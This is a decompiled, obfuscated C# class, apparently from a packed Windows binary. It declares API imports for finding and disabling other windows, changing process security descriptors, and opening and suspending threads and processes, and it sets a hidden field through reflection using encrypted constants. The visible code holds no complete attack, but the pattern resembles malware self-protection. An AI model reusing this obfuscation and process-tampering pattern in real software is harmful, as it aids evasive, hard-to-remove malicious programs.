using System;
using System.Reflection;
using System.Runtime.InteropServices;
using nUpz9SFiOg;

namespace ns2;

internal class jcUqQOeESN8z
{
	public struct aV8beYM7w0mg
	{
		public int sFwtZ8WWEZLm;

		public IntPtr TrvbFewL8RiY;

		public int eFTkSn1vGirh;
	}

	[Flags]
	internal enum a2OthgXxKueC
	{
		flag_0 = 1,
		FxVPB1c2UPFt = 2,
		mHi0qfh1S8YJ = 8,
		yMlKl0rjRuN9 = 0x10,
		bYFJEriFVMBj = 0x20,
		f4WLBIdWxEfw = 0x40,
		dSy1gDFhNthS = 0x80,
		cJdvPtm70YXW = 0x100,
		flag_8 = 0x200
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr FindWindow(string kl8DMyBxHeHf, string EJwGBhQitgPI);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr FindWindowEx(IntPtr QFbxbdhm6lsV, IntPtr Ucvul1Nv7wQJ, string I9awmCaNREAt, string wTlQhb0AMlE5);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool EnableWindow(IntPtr axRKKrxbtatS, bool bool_0);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ShowWindow(IntPtr QHAsxkRrhbvk, int int_0);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool SetKernelObjectSecurity(IntPtr intptr_0, int int_0, [In] IntPtr q8EX6Zj9V29e);

	[DllImport("Advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor([In] string ORsNUkzrgeFZ, [In] uint swJKODlb4OUg, out IntPtr TCWOo33bMeHd, out int int_0);

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenThread(a2OthgXxKueC a2OthgXxKueC_0, bool ikbN2Jl1gPN6, uint JdyTLaW92CRh);

	[DllImport("kernel32.dll")]
	public static extern uint SuspendThread(IntPtr UlQWAYqi00Lb);

	[DllImport("kernel32.dll")]
	public static extern int ResumeThread(IntPtr VVGQcsMtvLye);

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int LLEFR62Yq3UI, bool eyNSNdikM4cZ, int si57kn11UfXy);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CloseHandle(IntPtr aBsc2TwVhsu1);

	public static void H3GWERAbt4no()
	{
		jcUqQOeESN8z.QsNvkvoZPqLEqlFGBbbqHGnOquQC(jcUqQOeESN8z.ejZVouIQVJGsZlccrDxmIoJkCKCh(jcUqQOeESN8z.iwGsBDLzcnxuFpzBALaREjCfWqFl(typeof(IljmpP6sKLgk).TypeHandle), _003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<string>(574882119u), (BindingFlags)_003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(3986215641u)), (object)null, (object)IljmpP6sKLgk.qpA3Kl2TpMvT);
	}

	static Type iwGsBDLzcnxuFpzBALaREjCfWqFl(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static FieldInfo ejZVouIQVJGsZlccrDxmIoJkCKCh(Type type_0, string string_0, BindingFlags bindingFlags_0)
	{
		return type_0.GetField(string_0, bindingFlags_0);
	}

	static void QsNvkvoZPqLEqlFGBbbqHGnOquQC(FieldInfo fieldInfo_0, object object_0, object object_1)
	{
		fieldInfo_0.SetValue(object_0, object_1);
	}
}
